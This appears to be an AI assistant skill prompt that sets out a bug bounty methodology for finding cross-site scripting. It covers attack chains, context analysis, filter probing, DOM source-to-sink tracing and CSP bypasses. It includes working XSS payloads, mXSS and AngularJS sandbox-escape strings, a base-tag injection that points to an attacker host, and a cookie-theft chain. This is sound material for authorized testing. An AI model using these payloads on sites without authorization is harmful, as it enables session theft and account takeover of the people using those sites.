---
description: "XSS hunting methodology. TRIGGER: user is testing for cross-site scripting (reflected, stored, DOM-based), CSP bypass, sink analysis, mXSS, AngularJS sandbox escape, or any client-side JS injection."
---

# /hunt-xss - Cross-Site Scripting Hunting

You are assisting **Liodeus (YesWeHack)**, whose XSS reports span DOM-based postMessage sinks, stored XSS via SVG uploads, mXSS through HTML sanitizer round-trips, and AngularJS template injection on legacy pages. **Reflected XSS without auth or with same-origin impact is the floor; stored XSS with admin-context impact is the ceiling.**

## Core Philosophy

XSS is a sink hunt, not a payload hunt. Don't spray `<script>alert(1)</script>` everywhere — find the sink (where data ends up), then craft the payload that fits the context. Three contexts cover 95% of cases:
1. **HTML body** — break tags, inject new tags
2. **Attribute** — break out of attribute, add event handler
3. **JS context** — break out of string, statement-inject

For DOM XSS: it's all about source → sink. Find the source (`location`, `postMessage`, `cookie`, `localStorage`), trace it to a dangerous sink (`innerHTML`, `eval`, `document.write`, `setAttribute('on*', ...)`).

## XSS Chains (from real reports)

### Chain 1: Reflected XSS → ATO via cookie / token theft
1. Reflected XSS in a logged-in context (or chainable to one)
2. Payload reads `document.cookie` (if not HttpOnly) or calls `/api/me` and exfils to attacker
3. Combine with no-CSRF endpoint to perform actions in victim's context

### Chain 2: Stored XSS in admin panel
1. Plant payload in a field rendered to admins (similar to bXSS but with direct rendering)
2. Admin views user list / ticket / log → payload fires
3. Steal admin session / inject into admin's view of other users → mass impact

### Chain 3: DOM XSS via postMessage
1. Find a `window.addEventListener('message', e => ...)` that doesn't check `e.origin`
2. Or checks `e.origin.indexOf('target.com') !== -1` (matches `target.com.evil.com`)
3. Iframe the target from your domain, postMessage payload, sink fires
4. Common sinks: `eval(e.data)`, `innerHTML = e.data`, `location = e.data.url`

### Chain 4: SVG upload → stored XSS
1. App accepts SVG as profile pic / image
2. SVG contains `<script>` or `<foreignObject>` with HTML
3. Served from same origin (not via image CDN with restrictive CSP) → script executes
4. If served from a separate cookieless origin, less impact — but still XSS

### Chain 5: mXSS through sanitizer round-trip
1. App sanitizes input with library X, then a different layer reparses (e.g. into DocumentFragment, Markdown→HTML, etc.)
2. Sanitizer-safe input mutates into XSS-bearing HTML on reparse
3. Classic: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` mutates differently in HTML5 parser
4. mXSS cheatsheet: Cure53 mXSS PoCs, DOMPurify bypasses

### Chain 6: AngularJS sandbox escape
1. Legacy page using AngularJS 1.x with user-controlled data in a binding context
2. Payload like `{{constructor.constructor('alert(1)')()}}` — varies by AngularJS version
3. Often hides in CMS / template-rendered content / error messages

### Chain 7: Markdown / WYSIWYG bypasses
1. Rich text editors that allow HTML (Quill, TinyMCE, ProseMirror)
2. Markdown renderers that allow inline HTML
3. Image alt-text injection: `![](x" onerror="alert(1)//)`
4. Link injection: `[click](javascript:alert(1))`

### Chain 8: CSP bypass
* `unsafe-inline` — game over
* `script-src 'self'` + JSONP endpoint on same origin → bypass via JSONP callback
* `script-src https://cdn.jsdelivr.net` → load any package as a module
* `script-src 'nonce-XYZ'` → if nonce leaks in another vuln, reuse
* `script-src 'strict-dynamic'` → dangling markup attacks via legitimate scripts that load more
* Base-URI not set → `<base href="//attacker.com/">` redirects relative scripts
* `default-src 'none'` but `style-src 'unsafe-inline'` → CSS exfil tricks

## Discovery Methodology

### Step 1: Reflected — input mapping
* Every parameter in URL, body, headers
* Submit a unique marker per input: `xss12345`, `xss12346`, ...
* Crawl/spider the app, then grep all responses (HTML, JSON, JS) for each marker
* For each reflection: HTML body, attribute, JS string, JSON value (does it get rendered into HTML?), CSS, URL

### Step 2: Context analysis
For each reflection, look at the surrounding bytes:
* `<div>MARKER</div>` → HTML body context, `<svg onload=...>` works
* `<input value="MARKER">` → attribute, break with `"` or single quote
* `<script>var x = "MARKER";</script>` → JS string, break with `"` or `';alert(1);//`
* `<a href="MARKER">` → URL context, try `javascript:alert(1)`
* JSON in `<script>` → check if quotes are escaped, try `</script><svg onload=alert(1)>`

### Step 3: Filter probing
Once you've found a reflection, probe what's filtered:
1. Try `<a>` (lowercase) — passes? → tag whitelist might allow it
2. Try `<script>` — passes? → likely no filter
3. Try `<svg>`, `<img>`, `<iframe>` — which survive?
4. Try event handlers: `onerror`, `onload`, `onclick`, `onfocus`, exotic ones (`onbeforetoggle`, `onpointerrawupdate`)
5. Try encoding: HTML entities, URL-encoding, double-encoding, Unicode (`<`)
6. Check for case-sensitivity, length cap, null-byte truncation

### Step 4: DOM XSS
* Pull every JS file
* Grep for sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout` with string, `Function(`, `setAttribute('on...`)`, `location =`, `srcdoc =`
* Grep for sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `localStorage`, `document.cookie`, `URLSearchParams`
* For each sink, trace backward — does data flow from a source to here without sanitization?
* Tools: DOM Invader (Burp), Static Analysis with `ast-grep`, manual code review

### Step 5: Stored
* Every persistence boundary: profile, posts, comments, tickets, files, custom fields
* For each, plant a unique payload. Visit the rendering page as victim role (or yourself).
* Don't forget ALT contexts: emails sent by the system (preview rendered in webmail), exports (PDF, CSV opened in Excel — formula injection is adjacent), API responses rendered by 3rd-party tools

## Impact Demonstration

* PoC URL or steps that fire the alert in a fresh session
* For stored: reproduce on a fresh victim account
* Show what's exfiltrable: cookie, CSRF token, account data, ability to act on victim's behalf
* If CSP is in play, show the bypass (or note the CSP's effective protection level)
* Specify: same-origin or sandboxed? With or without auth?

## Key Considerations

* `alert(1)` is fine for triage but explain real impact in the report (cookie theft, ATO, action-on-behalf)
* Reflected XSS in 2026 is mostly informative unless: chainable to ATO, hits a high-value page (login, payment), or unauth on production
* Stored XSS in admin panel is almost always P1
* Self-XSS only counts if you can chain it (open redirect, file upload, login CSRF)
* `<script>` is rarely the right answer — `<svg onload>`, `<img onerror>`, attribute injection, `javascript:` URI all bypass naive filters
* Always check: does the page have `Content-Type: text/html`? If `application/json` or `text/plain`, no XSS regardless of reflection
* Trailing slash, file extension, charset header all change rendering — test the actual page, not a curl
